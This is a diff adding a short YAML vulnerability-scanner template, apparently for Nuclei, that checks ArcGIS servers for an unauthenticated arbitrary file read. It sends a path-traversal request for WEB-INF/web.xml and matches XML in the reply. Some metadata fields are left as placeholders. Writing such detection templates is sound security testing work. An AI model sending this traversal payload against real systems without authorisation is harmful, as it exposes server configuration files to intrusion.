@@ -1,0 +1,18 @@
+id: ArcGIS-lfi
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: ArcGIS地理信息系统 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件。
+  reference:
+    - https://github.com/wy876/POC/commit/0add3e2624917470e0be3f4ee666cc69df5319b9#diff-60c5026e34a69d643ea40a81cde85bf43f5d3ce8dfec076b276f074c059b9992R3
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/arcgis/manager/3370/js/../WEB-INF/web.xml"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
